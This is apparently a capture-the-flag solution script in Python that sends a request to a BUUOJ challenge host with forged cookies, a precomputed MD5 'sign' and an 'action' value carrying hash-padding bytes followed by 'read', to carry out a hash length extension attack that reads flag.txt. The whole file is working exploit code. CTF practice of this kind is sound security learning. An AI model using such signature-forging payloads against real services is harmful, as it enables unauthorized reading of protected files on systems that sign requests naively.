import requests

url = 'http://45423218-c090-48e4-af34-88ad7523f78f.node3.buuoj.cn/De1ta?param=flag.txt'

cookies = {
  'sign': '0b78be0ecb77afd83c52222232f4dea5',
  'action': 'scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read',
  }

res = requests.get(url=url, cookies=cookies)
print(res.text)